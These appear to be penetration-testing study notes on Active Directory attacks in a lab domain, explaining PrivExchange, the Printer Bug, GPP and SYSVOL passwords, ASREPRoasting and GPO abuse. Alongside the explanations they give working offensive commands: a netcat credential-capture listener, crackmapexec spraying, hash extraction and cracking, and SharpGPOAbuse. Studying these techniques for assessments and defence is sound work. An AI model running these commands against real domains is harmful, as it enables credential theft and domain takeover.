
#### Exchange related group membership
- Microsoft exchange, when installed in AD environment, gets highly privileged by default.Two groups matter most here:

### Exchange Windows Permissions

- Not a "protected group" in AD, so it gets less scrutiny
- Members can **write a DACL (Discretionary Access Control List) to the domain object**
- This means an attacker who lands in this group can grant themselves **DCSync privileges** — the ability to replicate all password hashes from the domain controller, just like a legitimate DC would

**How attackers get in:**

- Exploit a DACL misconfiguration
- Compromise an Account Operators member (who can add users to this group)

### Organization Management

- Think of it as **"Domain Admins for Exchange"**
- Can read **all mailboxes** in the domain
- Has **full control** over the OU called "Microsoft Exchange Security Groups" (which contains Exchange Windows Permissions)

> **Why Exchange servers are goldmines:** When you compromise an Exchange server, users who logged into **Outlook Web Access (OWA)** have their credentials cached in memory. Dumping that memory can yield dozens or even hundreds of cleartext passwords or NTLM hashes.

## 2. PrivExchange Attack

This exploits a specific Exchange feature called **PushSubscription**.

**The chain:**

1. Exchange has a "push notification" feature where it can subscribe to changes and notify external hosts
2. Any domain user with a mailbox can **force the Exchange server to authenticate** to an attacker-controlled host over HTTP
3. Exchange runs as **SYSTEM** and has `WriteDacl` on the domain object (pre-2019 patch)
4. The attacker **relays** that authentication to LDAP
5. Result: dump the entire NTDS database (all AD hashes), or at minimum get Domain Admin

The key insight is that Exchange's over-privileged nature + its authentication behavior = a path straight to Domain Admin from any regular user account.

## 3. The Printer Bug (MS-RPRN)

### What is MS-RPRN?

It's the **Print System Remote Protocol** — how Windows handles communication between print clients and print servers.

### The flaw:

Two RPC methods are involved:

- `RpcOpenPrinter` — opens a connection to the print spooler
- `RpcRemoteFindFirstPrinterChangeNotificationEx` — tells the server to notify a specific host when something changes

Any **domain user** can call these methods and tell a server: _"Hey, notify THIS host when something changes."_ The server will then authenticate to that host over **SMB** using its **machine account** (which runs as SYSTEM).

### Why it matters:

- The Spooler service runs as **SYSTEM**
- An attacker can relay that SYSTEM-level authentication to **LDAP** and grant themselves **DCSync** privileges
- Or relay it to set up **Resource-Based Constrained Delegation (RBCD)** — giving the attacker the ability to authenticate as any user on the victim machine
### Cross-forest use:
If a Domain Controller in another forest has **Unconstrained Delegation** enabled, the Printer Bug can be used to **attack across forest trusts** once you already have admin access in one forest.

**Checking vulnerability:**

```powershell
Import-Module .\SecurityAssessment.ps1
Get-SpoolStatus -ComputerName ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
# Returns True = vulnerable
```

## 4. MS14-068 (Kerberos PAC Forgery)

### Background — What is the PAC?

When Kerberos issues a ticket, it includes a **Privilege Attribute Certificate (PAC)** inside it. The PAC contains:

- Your username
- Your user ID
- Your **group memberships**

The PAC is **signed by the KDC** (Key Distribution Center = Domain Controller) so nobody can tamper with it.

### The flaw:

MS14-068 allowed an attacker to **forge a PAC** and have the KDC accept it as legitimate. You could forge a PAC that says you're a member of **Domain Admins**, then present it to get a valid ticket with DA privileges.

**Tools:** PyKEK (Python Kerberos Exploitation Kit), Impacket

**Defense:** Patching only. This was patched in 2014 but unpatched systems are still found in the wild.

## 5. Sniffing LDAP Credentials

Many devices — **printers, scanners, web applications** — need to authenticate against Active Directory. They do this over **LDAP (port 389)**. Admins store these credentials in the device's web admin panel.

### The attack:

1. Find a device with an LDAP configuration panel (often with default/weak admin password)
2. Change the **LDAP server IP** to your attack machine's IP
3. Set up a **netcat listener** on port 389
4. Click "Test Connection"
5. The device sends its LDAP credentials to you — often **in cleartext**

bash

```bash
nc -lvnp 389
# Wait for device to connect and send credentials
```

These LDAP service accounts are often **privileged** since they need to query AD, so this can be a quick foothold or privilege escalation.

## 6. DNS Enumeration with adidnsdump

### Why DNS matters in AD:

All AD-joined computers register DNS records. If you can enumerate all DNS entries, you can **discover hosts** that don't show up in normal enumeration — internal servers, dev systems, management interfaces, etc.

### The trick:

By default, LDAP queries for DNS don't return all records. The `adidnsdump` tool uses a specific method to retrieve **all** DNS records because standard AD users can list DNS zone child objects.

**Basic run:**
```bash
adidnsdump -u inlanefreight\\forend ldap://172.16.5.5
```
Some records come back as `?,LOGISTICS,?` — unknown.

**With `-r` flag (resolve unknowns):**

```bash
adidnsdump -u inlanefreight\\forend ldap://172.16.5.5 -r
```

Now `LOGISTICS` resolves to `172.16.5.240` — a "hidden" host you wouldn't have found otherwise. In large environments, this regularly uncovers interesting targets like Jenkins servers, backup systems, etc.

## 8. PASSWD_NOTREQD Flag

In the `userAccountControl` attribute, there's a flag called `PASSWD_NOTREQD`. When set, the account is **exempt from password policy** — meaning it may have:

- A very short password
- An empty/blank password

### Why does this exist?

- Vendors sometimes set it during software installation and forget to remove it
- Admins sometimes accidentally set it
- Some legacy systems need it

**Enumerate:**
```powershell
Get-DomainUser -UACFilter PASSWD_NOTREQD | Select-Object samaccountname,useraccountcontrol
```

**Important:** Having this flag doesn't _guarantee_ no password — it just means one might not be required. Always test these accounts by trying to authenticate with no password or a simple one.

## 9. Credentials in SYSVOL / SMB Shares

### What is SYSVOL?

A special share on every Domain Controller (`\\DC\SYSVOL`) that stores:

- Group Policy files
- Logon scripts
- Other domain-wide configuration

**Every authenticated domain user can read SYSVOL.**

### What attackers look for:

Scripts in `\\DC\SYSVOL\domain\scripts\` often contain hardcoded credentials:

vbscript

```vbscript
sUser = "Administrator"
sPwd = "!ILFREIGHT_L0cALADmin!"
```

These are often **local admin passwords** for workstations. Even if the script is old, due to password reuse, the credential might still work across many hosts. Test with CrackMapExec:

bash

```bash
crackmapexec smb 172.16.5.0/24 -u Administrator -p '!ILFREIGHT_L0cALADmin!' --local-auth
```

## 10. GPP (Group Policy Preferences) Passwords

This is one of the most well-known AD misconfigurations.

### Background:

Before 2014, admins could use **Group Policy Preferences** to:

- Set local admin passwords on machines
- Configure autologon credentials
- Map drives with credentials

These settings were stored in **XML files on SYSVOL** (readable by all domain users). The passwords were "encrypted" with AES-256... but Microsoft **published the encryption key on MSDN**. So the "encryption" was meaningless.

### The XML structure:

xml

```xml
<Properties ... cpassword="VPe/o9YRyz2cksnYRbNeQj35w9KxQ5ttbvtRaAVqxaE" />
```

**Decrypt with gpp-decrypt:**

bash

```bash
gpp-decrypt VPe/o9YRyz2cksnYRbNeQj35w9KxQ5ttbvtRaAVqxaE
# Output: Password1
```

### The patch (MS14-025):

Microsoft patched the _ability to set new GPP passwords_ in 2014, but **never removed existing ones**. Old `Groups.xml` files with cpassword values still exist on many SYSVOL shares.

**Find GPP passwords with CrackMapExec:**

bash

```bash
crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M gpp_password
crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M gpp_autologin
```

The `gpp_autologin` module specifically looks for `Registry.xml` which stores autologon credentials — also in cleartext, and **Microsoft has never patched this one**.

## 11. ASREPRoasting

### Understanding Kerberos pre-authentication first:

Normal Kerberos flow:

1. User wants a TGT (Ticket Granting Ticket)
2. Client sends an **encrypted timestamp** (encrypted with the user's password hash)
3. DC decrypts it → validates the password → issues the TGT

**Pre-authentication = that timestamp step.** It proves you know the password _before_ the DC gives you a ticket.

### The misconfiguration:

Some accounts have **"Do not require Kerberos pre-authentication"** enabled (the `DONT_REQ_PREAUTH` flag). This means:

- The DC will hand out an AS-REP (authentication service reply) to _anyone_ who asks
- The AS-REP is **encrypted with the user's password hash**
- An attacker can request this without knowing the password and crack it offline

### Attack steps:

**1. Find vulnerable accounts:**

powershell

```powershell
Get-DomainUser -PreauthNotRequired | select samaccountname,useraccountcontrol
```

**2. Get the AS-REP hash (Windows - Rubeus):**

powershell

```powershell
.\Rubeus.exe asreproast /user:mmorgan /nowrap /format:hashcat
```

**3. Get the AS-REP hash (Linux - Impacket):**

bash

```bash
GetNPUsers.py INLANEFREIGHT.LOCAL/ -dc-ip 172.16.5.5 -no-pass -usersfile valid_ad_users
```

**4. Crack offline with Hashcat:**

bash

```bash
hashcat -m 18200 hash.txt /usr/share/wordlists/rockyou.txt
# Mode 18200 = Kerberos 5 AS-REP
```

**Bonus — Kerbrute:** When doing username enumeration with Kerbrute, it **automatically retrieves AS-REP hashes** for any account it finds that doesn't require pre-auth. Two steps in one.

### ASREPRoasting vs Kerberoasting comparison:

||ASREPRoasting|Kerberoasting|
|---|---|---|
|Target ticket|AS-REP|TGS-REP|
|Requires auth?|No|Yes|
|Requires SPN?|No|Yes|
|Hashcat mode|18200|13100|
|Flag|DONT_REQ_PREAUTH|Has an SPN|

## 12. GPO (Group Policy Object) Abuse

### What is a GPO?

A GPO is a collection of settings that gets **pushed to computers and users** in an OU (Organizational Unit). Admins use them to enforce security policies, deploy software, configure settings, etc.

### The misconfiguration:

If a regular user or group (like **Domain Users**) has **write permissions** over a GPO, they can modify that GPO to:

- Add themselves as local admin on affected machines
- Create a scheduled task that runs a reverse shell
- Grant themselves special privileges (SeDebugPrivilege, SeImpersonatePrivilege, etc.)
- Set a malicious startup script

### Finding vulnerable GPOs:

**List all GPOs:**

powershell

```powershell
Get-DomainGPO | select displayname
```

**Check if Domain Users have GPO rights:**

powershell

```powershell
$sid = Convert-NameToSid "Domain Users"
Get-DomainGPO | Get-ObjectAcl | ?{$_.SecurityIdentifier -eq $sid}
```

**Convert GPO GUID to readable name:**

powershell

```powershell
Get-GPO -Guid 7CA9C789-14CE-46E3-A722-83F4097AF532
```

**Exploit with SharpGPOAbuse:**

powershell

```powershell
.\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount attacker --GPOName "Disconnect Idle RDP"
```

⚠️ **Be careful:** If the GPO applies to an OU with 1,000 computers, your change affects all 1,000. Always scope your attack carefully.

## The Big Picture — How These Connect

```
Initial foothold
      │
      ▼
Check description fields ──────────────────► Plaintext password
      │
      ▼
Check SYSVOL scripts ───────────────────────► Hardcoded credentials
      │
      ▼
Check GPP passwords ────────────────────────► Decryptable passwords
      │
      ▼
ASREPRoast / Kerberoast ────────────────────► Crackable hashes
      │
      ▼
GPO write access ───────────────────────────► Local admin on machines
      │
      ▼
Exchange compromise ────────────────────────► Domain Admin
```

Each misconfiguration builds on the last. In real assessments, you chain multiple techniques — a GPP password leads to a service account, that account has GPO write access, that GPO leads to local admin on the Exchange server, and that gives you Domain Admin.
